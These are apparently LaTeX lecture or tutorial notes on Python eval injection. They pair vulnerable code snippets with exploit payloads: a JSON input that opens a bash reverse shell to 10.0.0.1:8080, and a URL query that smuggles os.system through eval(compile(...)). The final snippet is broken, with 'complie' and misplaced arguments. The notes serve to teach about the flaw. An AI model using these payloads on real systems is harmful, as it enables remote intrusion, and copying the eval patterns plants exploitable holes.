\section{Eval, exec, input exploit}

\subsection{Eval}
\subsubsection{Introduction}
Dynamically evaluate {\bf expressions} from a string-based or compiled-code-based input. 

\begin{verbatim}
An expression A piece of syntax which can be evaluated to some value. In other
words, an expression is an accumulation of expression elements like literals,
names, attribute access, operators or function calls which all return a value.
In contrast to many other languages, not all language constructs are
expressions. There are also statements which cannot be used as expressions,
such as while. Assignments are also statements, not expressions.
\end{verbatim}


With a string, \verb+eval+ parses it, compiles it to bytecode, and evaluates it as a Python expression. 

With a compiled code object, \verb+eval+ performs just the evaluation step,
which is quite convenient if you call \verb+eval()+ several times with the same
input.


\subsubsection{Basic Exploit}
The following calculator application uses a JSON API to accept user input:
\begin{verbatim}
def addition(a, b):
  return eval("%s + %s" % (a, b))

result = addition(request.json['a'], request.json['b'])
print("The result is %d." % result)
\end{verbatim}


\begin{verbatim}
{"a":"__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#", "b":"2"}
\end{verbatim}



\subsubsection{Exploit 2}

\begin{verbatim}
url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
\end{verbatim}

\begin{verbatim}
engine=google&query=1'%2beval(compile("import+os\nos.system('ls')+",'<string>',
'exec'))%2b'&...
\end{verbatim}


\begin{verbatim}
eval(complie("code to execute"), "<String>", "exec")
\end{verbatim}


